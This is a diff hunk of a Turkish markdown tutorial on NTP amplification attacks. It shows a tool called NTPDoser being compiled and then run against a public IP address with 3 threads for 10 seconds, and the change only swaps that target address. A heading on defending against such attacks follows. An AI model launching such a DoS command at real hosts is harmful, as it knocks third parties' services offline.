@@ -78,9 +78,9 @@ root@Stormer:~/NTPDoser# gcc NTPDoser.cpp  -o NTPDoser  -lstdc++  -pthread
 ```
 Yukarıdaki komutunun çalıştırılması ile NTPDoser.cpp dosyası derlenerek NTPDoser çalıştırılabilir dosyası oluşturulur.
 ```linux
-root@Stormer:~/NTPDoser# ./NTPDoser 172.67.160.65 3 10
+root@Stormer:~/NTPDoser# ./NTPDoser 104.28.28.246 3 10
 ```
-Yukarıda, NTPDoser aracı ile NTP Amplification saldırısı yapılmıştır. 172.67.160.65 IP adresine yönelik NTP Amplification saldırısını 3 farklı thread’den 10 saniye içerisinde yapmaktadır.
+Yukarıda, NTPDoser aracı ile NTP Amplification saldırısı yapılmıştır. 104.28.28.246 IP adresine yönelik NTP Amplification saldırısını 3 farklı thread’den 10 saniye içerisinde yapmaktadır.
 
 ## NTP Amplification Saldırılarına Karşı Koruma
 
